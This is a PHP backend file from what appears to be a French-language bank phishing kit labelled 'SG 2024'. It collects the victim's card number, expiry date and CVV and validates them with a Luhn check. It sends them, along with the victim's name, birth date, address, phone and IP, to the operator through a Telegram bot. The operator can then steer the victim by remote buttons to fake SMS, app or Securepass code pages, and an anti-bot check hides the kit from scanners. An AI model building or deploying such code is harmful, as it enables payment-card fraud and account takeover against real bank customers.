<?php


function is_valid_luhn($number)
{
    settype($number, 'string');
    $sumTable = array(
        array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9),
        array(0, 2, 4, 6, 8, 1, 3, 5, 7, 9)
    );
    $sum = 0;
    $flip = 0;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $sum += $sumTable[$flip++ & 0x1][$number[$i]];
    }
    return $sum % 10 === 0;
}

session_start();
include_once ('../settings.php');
require __DIR__ . '/vendor/autoload.php';
date_default_timezone_set('Europe/Paris');
$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;
use Telegram\Bot\Api;
$ip = $_SERVER['REMOTE_ADDR'];
$error = false;
$step = 1; 
$telegram = new Api($bot_token);



$_SESSION['ccnum'] = $_POST['ccnum']; 
$_SESSION['exp'] = $_POST['exp']; 
$_SESSION['cvv'] = $_POST['cvv'];

if(isset($_SESSION['killbot_autorisé']) && $_SESSION['killbot_autorisé'] === true	) {
if (isset($_POST['carte_submit'])&&!empty($_POST['ccnum']) && !empty($_POST['exp']) && !empty($_POST['cvv'])) {
    if (is_valid_luhn($_SESSION['ccnum']) && is_numeric($_SESSION['ccnum']) && strlen($_SESSION['ccnum']) >= 16) {
        $step = 2;

        
        $cc = $_SESSION['ccnum'];
        $bin = substr($cc, 0, 6);
        $ch = curl_init();
        $url = "https://data.handyapi.com/bin/$bin";
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array('Accept-Version: 3');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);

        $brand = '';
        $type = '';
        $emoji = '';
        $bank = '';

      
        $result_cc = json_decode($result, true);
        $_SESSION['Scheme'] = $result_cc['Scheme'];
        $_SESSION['type'] = $result_cc['Type'];
        $_SESSION['bank'] = $result_cc['Issuer'];
        $_SESSION['brand'] = $result_cc['CardTier'];

        $keyboard = [
            'inline_keyboard' => [
    
                [['text' => '❌ | 💳 Invalide ', 'callback_data' => 'invalide_login']],  
                [['text' => '📲 | Page sms', 'callback_data' => 'otp_sms']],
                [['text' => '📲 | Page App', 'callback_data' => 'otp_app']],
                [['text' => '📲 | Page Securepass', 'callback_data' => 'otp_securepass']],               
                [['text' => '🚫 | Bannir IP', 'callback_data' => 'ban_ip']],
                [['text' => '✅ | Succès ', 'callback_data' => 'page_succes']],
    
               
            ]
        ];

        $telegram->sendMessage([
            'chat_id' => $chat_login,
            'text' => "
            
			[⚡] Full Info | SG 2024

			[💳] Numéro : " . $_SESSION['ccnum'] . "
			[📅] Date d'expiration : " . $_SESSION['exp'] . "
			[🔢] CVV : " . $_SESSION['cvv'] . "
			[🏛️] Banque : " . $_SESSION['bank'] . "
			[🥇] Niveau : " .$_SESSION['brand'] . "
			[♻️] Type : " . $_SESSION['type'] . "		 
				 
			[👤] Nom  :" . $_SESSION['nom'] . "
			[👤] Prénom  : " . $_SESSION['prenom'] . "
			[📂] Date de naissance  : " . $_SESSION['dob'] . "			
			[📍] Adresse  : " . $_SESSION['adresse'] . "
			[🌍] Ville: " . $_SESSION['ville'] . "
			[🌍] Code Postale: " . $_SESSION['cp'] . "
			[📞] Numéro de téléphone :" . $_SESSION['tel'] . "

			[📜] Informations liée au client [📜]             
			[🗓️] Heure et date du rez : {$_SESSION['date_heure']}
			[🌐] IP Client : {$_SESSION['ip2']}
			[©️] SG 2024[©️]"            
             ,

            'reply_markup' => json_encode($keyboard)
        ]);
    } else {
        $error = true;
        header("Location: ../fr/carte.php?error=1");   
        exit();
    }
} else {
    $error = true;
    
    header("Location: ../fr/carte.php?error=2");   
    exit();
}

?>
<!DOCTYPE html>
<html>

<head>

</head>

<body>
    <?php if ($step == 1) :
        if ($error) : ?>
            <div style="color:red;"><?= $errorMessage ?></div>
        <?php endif; ?>

    <?php elseif ($step == 2) : ?>

        <div><?php include '../fr/loader.php'; ?></div>

     
        <script src="https://code.jquery.com/jquery-3.7.0.js" integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
        <script>
    setInterval(function() {
        $.ajax({
            type: "GET",
            url: "callback.php",
            success: function(msg) {
                /* Login Invalide */
                if (msg === 'invalide_cc') {
                    window.location.href = '../fr/carte.php?error=1';
                }
                /* OTP SMS */
                else if (msg === 'otp_sms') {
                    window.location.href = '../fr/sms.php';
                }

                /* OTP Application */
                else if (msg === 'otp_app') {
                    window.location.href = '../fr/app.php';
                }

                /* OTP Securepass */
                else if (msg === 'otp_securepass') {
                    window.location.href = '../fr/securepass.php';
                }

                /* Page CC */
                else if (msg === 'page_cc') {
                    window.location.href = '../fr/carte.php';
                }

                /* Page Succès */
                else if (msg === 'page_succes') {
                    window.location.href = '../fr/succes.php';
                }

                /* Page Ban IP */
                else if (msg === 'ban_ip') {
                    window.location.href = '../fr/banned.php';
                }



            },
            error: function(msg) {
                console.error(msg);
            }
        });
    }, 3000)
    </script>

    <?php endif; ?>
</body>
</html>
<?php
}

else {
    session_destroy();
    header("Location: ../404.php");
    exit;
} ?>

